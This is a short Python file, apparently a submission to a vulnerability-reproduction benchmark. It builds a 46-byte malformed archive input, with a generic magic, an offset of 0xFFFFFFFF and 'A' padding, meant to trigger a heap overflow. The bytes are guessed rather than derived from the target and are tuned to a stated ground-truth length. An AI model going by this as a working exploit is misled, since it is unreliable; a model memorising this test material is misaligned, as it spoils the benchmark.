import os
import struct
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow vulnerability
        by creating a malformed archive with negative start offset.
        """
        # Ground-truth suggests 46 bytes is optimal
        # Construct a minimal malformed archive header
        # Format: [magic][offset_field][padding_to_46_bytes]
        
        # Common archive magic numbers
        # Using a generic 4-byte magic that might trigger vulnerable parser
        magic = b'ARCH'
        
        # Create offset field that when interpreted as signed becomes negative
        # Using 0xFFFFFFFF (-1 in two's complement 32-bit signed)
        offset_field = struct.pack('<I', 0xFFFFFFFF)  # Little-endian 32-bit
        
        # Remaining bytes to reach 46 total
        remaining = 46 - len(magic) - len(offset_field)
        
        # Fill with data that might trigger allocation based on offset
        # Using pattern that could cause overflow when offset is used for size
        padding = b'A' * remaining
        
        poc = magic + offset_field + padding
        
        # Validate length
        assert len(poc) == 46, f"PoC length {len(poc)} != 46"
        
        return poc
